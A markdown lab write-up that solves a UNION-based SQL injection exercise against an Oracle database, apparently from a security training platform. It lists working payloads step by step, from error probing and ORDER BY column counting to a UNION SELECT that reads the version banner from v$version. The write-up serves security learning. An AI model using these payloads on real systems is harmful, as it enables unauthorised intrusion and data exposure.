# SQL injection attack, querying the database type and version on Oracle

## Given:
- vulnerability in product category filter.

## Task:
- use a UNION attack to retrieve the results from an injected query.
    - display the database version string to solve the lab

## Analysis

- Examine product category filter, and append `'` in the url. => gives 500 internal server error.
- Error vanishes when comment(--) `'--` is used.
- double hyphens (--) are working for comments => database must be either oracle, microsoft or PostgreSQL.

- checking for number of columns (to perform union based SQLi)
    - payload: `ORDER BY 1--` => Response [200]
    - payload: `ORDER BY 2--` => Response [200]
    - payload: `ORDER BY 3--` => Response [500] ==> only two columns present in table

- checking for columns if it supports characters or not
    - payload: `UNION SELECT NULL, NULL--` => response [500]  ==> something fishy
    - payload: `UNION SELECT NULL, NULL FROM dual--` => response [200] ==> oracle database is used
    - payload: `UNION SELECT 'A', NULL FROM dual--` => response [200]
    - payload: `UNION SELECT 'A', 'A' FROM dual--` => response [200] ==> both columns supports the characters

- using payload to check database for oracle : `SELECT banner FROM v$version`
    - payload: `'UNION SELECT NULL, banner from v$version--` => response [200] ==> lab solved 
